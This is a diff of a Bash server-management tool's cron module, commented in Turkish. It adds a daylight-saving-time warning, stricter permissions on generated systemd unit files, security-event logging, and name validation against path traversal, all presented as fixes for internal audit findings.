+    # "private fonksiyon" işaretidir).
+    local dst_sfx dst_hhmm dst_rc=0
+    dst_sfx=$(_cron_calendar_tz_suffix "$calendar")
+    dst_hhmm=$(_cron_calendar_fixed_hhmm "$calendar")
+    if [[ -z "$dst_sfx" && -n "$dst_hhmm" ]]; then
+        _cron_server_tz_has_dst || dst_rc=$?
+        if (( dst_rc == 0 )); then
+            warn "YAZ SAATİ (DST) UYARISI: bu sunucunun dilimi (${tz_display}) yaz saati uyguluyor ve bu iş SUNUCU YEREL SAATİNE (${dst_hhmm}) bağlandı. Yılda iki kez şu olur:
+    * İLKBAHAR (saat ileri alınır): atlanan yerel saat aralığına denk gelen iş O GÜN HİÇ ÇALIŞMAZ.
+    * SONBAHAR (saat geri alınır): tekrarlanan aralığa denk gelen iş İKİ KEZ çalışabilir.
+  Risk: iki kez koşan bir YEDEKLEME diski doldurabilir; iki kez koşan bir PRUNE canlı release'i etkileyebilir; hiç koşmayan bir yedek o günü kaybeder.
+  En çok etkilenen aralık, geçişin yapıldığı gece saatleridir (çoğu dilimde 01:00–04:00) — bu iş ${dst_hhmm}'de.
+  Öneri: mutlak zamana bağlamak için '--utc' bayrağını kullanın (iş yılın her günü AYNI mutlak anda çalışır), ya da işi geçiş penceresinin DIŞINA (ör. 05:00) alın, ya da işi tekrarlanabilir/idempotent yazın."
+        fi
     fi
 
     # Persistent= — PER-JOB (CRON_PERSISTENT), sabit DEĞİL (bkz. yukarıdaki
@@ -1947,10 +2236,12 @@ _cron_add() {
         # YAZILMAZ. Eskiden dönüş değeri hiç kontrol edilmiyordu ve boş bir
         # lock_dir sessizce '/deploy-<sname>.lock' gibi anlamsız bir yola
         # (dolayısıyla ETKİSİZ bir deploy kilidine) dönüşürdü.
+        # 'error' DEĞİL 'security_error' (bkz. core.sh): red srvctl olay
+        # günlüğüne DE düşsün — deploy yolundaki AYNI görünürlük düzeltmesi.
         lock_dir=$(_cron_lock_dir "$sname" "$web_user") \
-            || error "Kilit dizini güvenli biçimde hazırlanamadı (yukarıdaki uyarıya bakın) — 'srvctl domain repair ${domain}' çalıştırın"
+            || security_error "CRON EKLEME REDDEDİLDİ (${domain}): deploy kilit ağacı güvenli biçimde hazırlanamadı (gerekçe yukarıdaki 'GÜVENLİK OLAYI' satırında). Çözüm: 'srvctl domain repair ${domain}'"
         [[ -n "$lock_dir" ]] \
-            || error "Kilit dizini yolu hesaplanamadı: ${domain}"
+            || security_error "CRON EKLEME REDDEDİLDİ (${domain}): kilit dizini yolu hesaplanamadı"
 
         if command -v flock >/dev/null 2>&1; then
             local lock_path lock_escaped
@@ -2060,6 +2351,25 @@ _cron_add() {
 
         [[ -d "$working_dir" ]] || warn "WorkingDirectory henüz yok: ${working_dir} (ilk 'srvctl deploy ${domain}' bekleniyor — timer tetiklendiğinde çalışmayabilir)"
     fi
+
+    # ─── UNIT DOSYASI İZİNLERİ (denetim O-2 — ÜRETİMDE DOĞRULANDI) ───
+    # Üretimde ölçülen: '/etc/systemd/system/srvctl-cron-<...>.service' ve
+    # eşlenik '.timer' → root:root 644, yani WORLD-READABLE. Sebebi
+    # 'render_template ... > "$svc_file"' yönlendirmesinin dosyayı root'un
+    # umask'ıyla (022) yaratmasıydı; hiçbir chmod/secure_file YOKTU.
+    # NEDEN ÖNEMLİ: ExecStart= satırı operatörün HAM komutunu içerir ve en
+    # yaygın gerçek cron işi bir yedeklemedir:
+    #     ExecStart=... /bin/sh -c 'mysqldump -u usr_x -pGIZLI db_x | gzip > ...'
+    # 644 ile bu parola sunucudaki HER yerel kullanıcı (ve ele geçirilmiş
+    # HER BAŞKA domain'in web_<sname> kullanıcısı) tarafından okunabilirdi.
+    # 640 root:root ile artık yalnız root okuyabilir. (Parolanın argv'de de
+    # görünmesi AYRI bir sorundur — bkz. _cron_warn_password_in_command.)
+    # NOT: '$sysd_dir'in KENDİSİNE dokunulmaz (/etc/systemd/system 755
+    # olmalıdır); yalnız srvctl'in YAZDIĞI dosyalar sertleştirilir.
+    secure_file "$svc_file" 640 "root:root" \
+        || warn "Unit dosyası izinleri uygulanamadı: ${svc_file}"
+    secure_file "$timer_file" 640 "root:root" \
+        || warn "Timer dosyası izinleri uygulanamadı: ${timer_file}"
 
     _cron_write_failure_hook "$sysd_dir" "$svc_name" "$fail_name" "$domain" "$name" "$is_system"
     _cron_write_sidecar "$sname" "$name" "$schedule" "$mode"
@@ -2217,6 +2527,7 @@ _cron_list() {
 _cron_show() {
     local scope_arg="${1:-}" name="${2:-}"
     [[ -n "$scope_arg" && -n "$name" ]] || error "Kullanım: srvctl cron show <domain>|--system <ad>"
+    _cron_ident_ok "$name" || error "$_CRON_IDENT_ERR"
 
     local sname="" scope_label domain=""
     if [[ "$scope_arg" == "--system" ]]; then
@@ -2293,6 +2604,7 @@ _cron_show() {
 _cron_run() {
     local scope_arg="${1:-}" name="${2:-}"
     [[ -n "$scope_arg" && -n "$name" ]] || error "Kullanım: srvctl cron run <domain>|--system <ad>"
+    _cron_ident_ok "$name" || error "$_CRON_IDENT_ERR"
 
     local sname="" domain=""
     if [[ "$scope_arg" != "--system" ]]; then
@@ -2332,6 +2644,7 @@ _cron_run() {
 _cron_set_enabled() {
     local want_enabled="$1" scope_arg="${2:-}" name="${3:-}"
     [[ -n "$scope_arg" && -n "$name" ]] || error "Kullanım: srvctl cron enable|disable <domain>|--system <ad>"
+    _cron_ident_ok "$name" || error "$_CRON_IDENT_ERR"
 
     local sname="" domain=""
     if [[ "$scope_arg" != "--system" ]]; then
@@ -2362,6 +2675,12 @@ _cron_set_enabled() {
 _cron_remove() {
     local scope_arg="${1:-}" name="${2:-}"
     [[ -n "$scope_arg" && -n "$name" ]] || error "Kullanım: srvctl cron remove <domain>|--system <ad>"
+    # ⚠ BU DOĞRULAMA BU FONKSİYONDA KRİTİKTİR: aşağıda 'rm -rf --
+    # "${sysd_dir}/${svc}.d"' vardır ve '$svc' doğrudan '$name'den türer.
+    # Yol geçişi ŞU AN varlık kapısı ([[ -e ... ]]) sayesinde TESADÜFEN
+    # çalışmıyor — ama 'rm -rf' içeren bir yolda tesadüfe güvenmek kabul
+    # edilemez. (Denetim O-4: doğrulama yalnız '_cron_add'de vardı.)
+    _cron_ident_ok "$name" || error "$_CRON_IDENT_ERR"
 
     local sname="" domain="" scope_label
     if [[ "$scope_arg" == "--system" ]]; then
@@ -2405,6 +2724,7 @@ _cron_remove() {
 _cron_logs() {
     local scope_arg="${1:-}" name="${2:-}"
     [[ -n "$scope_arg" && -n "$name" ]] || error "Kullanım: srvctl cron logs <domain>|--system <ad> [-n N]"
+    _cron_ident_ok "$name" || error "$_CRON_IDENT_ERR"
 
     local n=50
     local -a rest=("${@:3}")
